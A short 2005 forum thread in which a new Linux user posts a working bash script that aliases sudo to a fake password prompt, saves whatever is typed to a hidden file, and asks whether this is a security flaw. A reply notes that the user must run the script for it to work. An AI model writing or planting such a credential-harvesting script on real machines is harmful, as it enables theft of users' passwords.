---
title: "Possible flaw in Ubuntu / Debian"
date: 2005-07-28
forum: Server Platforms
---

### Post by bsoric on 2005-07-28
Hi, my name's Brett and I'm pretty new to linux, so I'm not sure whether or not the following post is a problem or not.

I recently wrote a script that, if run locally / remotely on a user's computer, can setup a fake sudo screen that saves the results to a file. The thing about this is that the script doesn't require user privileges to run.

I didnt know where else to send this, and I am hoping that one of you can write a patch or similar to fix it. Also, I'd rather the script-kiddies of the internet didn't see this if it is a problem, and as I've seen this forum is against crackers, I figured this was the best place to post it.

Following is my script:

#!/bin/bash
cd $HOME
echo "echo Password:" > .suod
echo "stty -echo" >> .suod
echo "read Pass" >> .suod
echo 'echo $Pass >> $HOME/.pass.txt' >> .suod
echo "stty echo" >> .suod
echo "echo Error using Sudo. Please use Root Terminal instead." >> .suod
chmod 777 .suod
echo "alias sudo=$HOME/.suod" >> .bashrc

Run that, and the next bash shell opened will include the fake Sudo program.

Is this a security risk? If so, please tell me how it can be fixed. If not, please don't laugh.

Brett

---

### Post by LordHunter317 on 2005-07-28
No, that last line requires permissions to edit the user's ~/.bashrc file.

So yeah, this is an issue, if you can get the user to run it.

---

